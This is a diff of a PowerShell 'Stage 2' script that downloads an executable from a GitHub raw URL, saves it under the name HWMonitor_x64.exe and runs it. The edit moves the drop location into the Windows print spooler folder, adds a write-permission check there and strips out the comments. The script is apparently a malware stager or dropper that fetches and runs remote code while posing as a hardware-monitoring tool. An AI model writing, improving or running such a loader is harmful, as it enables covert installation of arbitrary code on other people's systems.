@@ -1,30 +1,35 @@
-# === Stage 2: Download binary from GitHub and execute ===
+# === Stage 2: Download and execute binary from GitHub to C:\Windows\System32\spool\PRINTERS ===
 
-# Force TLS 1.2 to ensure secure HTTPS connection works
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# URL to your raw GitHub binary file - replace with your actual raw URL
 $BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
-
-# Destination path for the binary (world-writable directory)
-$DestinationPath = "$env:TEMP\HWMonitor_x64.exe"
+$DestinationDir = "C:\Windows\System32\spool\PRINTERS"
+$DestinationPath = Join-Path $DestinationDir "HWMonitor_x64.exe"
 
 try {
-    Write-Host "[*] Starting download from GitHub..."
+    # Test if directory exists
+    if (-Not (Test-Path -Path $DestinationDir)) {
+        Write-Host "[-] Destination directory does not exist: $DestinationDir"
+        exit 1
+    }
+
+    # Test write permission
+    $testFile = Join-Path $DestinationDir "test_write.txt"
+    "test" | Out-File -FilePath $testFile -Encoding ascii -Force
+    Remove-Item -Path $testFile -Force
+    Write-Host "[*] Write permission confirmed in $DestinationDir"
+
+    # Download the binary
+    Write-Host "[*] Downloading binary from $BinaryUrl to $DestinationPath"
     Invoke-WebRequest -Uri $BinaryUrl -OutFile $DestinationPath -Headers @{ "User-Agent" = "Mozilla/5.0" } -UseBasicParsing
-    Write-Host "[+] Downloaded binary to $DestinationPath"
-}
-catch {
-    Write-Host "[-] Failed to download the binary: $_"
-    exit 1
-}
+    Write-Host "[+] Downloaded binary."
 
-try {
-    Write-Host "[*] Executing the binary..."
+    # Execute the binary
+    Write-Host "[*] Executing binary..."
     Start-Process -FilePath $DestinationPath
     Write-Host "[+] Binary execution started."
 }
 catch {
-    Write-Host "[-] Failed to execute the binary: $_"
+    Write-Host "[-] Error: $_"
     exit 1
 }
